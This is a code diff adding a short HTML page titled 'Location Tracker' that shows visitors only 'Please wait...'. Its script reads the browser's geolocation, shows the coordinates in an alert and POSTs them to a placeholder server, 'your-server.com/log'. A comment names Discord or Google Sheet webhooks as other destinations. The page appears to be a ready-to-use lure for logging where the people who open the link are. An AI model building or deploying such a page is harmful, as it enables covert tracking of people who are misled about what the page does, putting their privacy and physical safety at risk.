@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Tracker</title>
+</head>
+<body>
+  <h1>Please wait...</h1>
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
+      var message = "Latitude: " + latitude + " | Longitude: " + longitude;
+
+      // Send location to your server or show it on screen
+      alert("Your location:\n" + message);
+      // Example: send data to webhook (like Discord, Google Sheet, etc.)
+      fetch("https://your-server.com/log", {
+        method: "POST",
+        body: JSON.stringify({lat: latitude, lon: longitude}),
+        headers: {"Content-Type": "application/json"}
+      });
+    }, function(error) {
+      alert("Location access denied!");
+    });
+  </script>
+</body>
+</html>
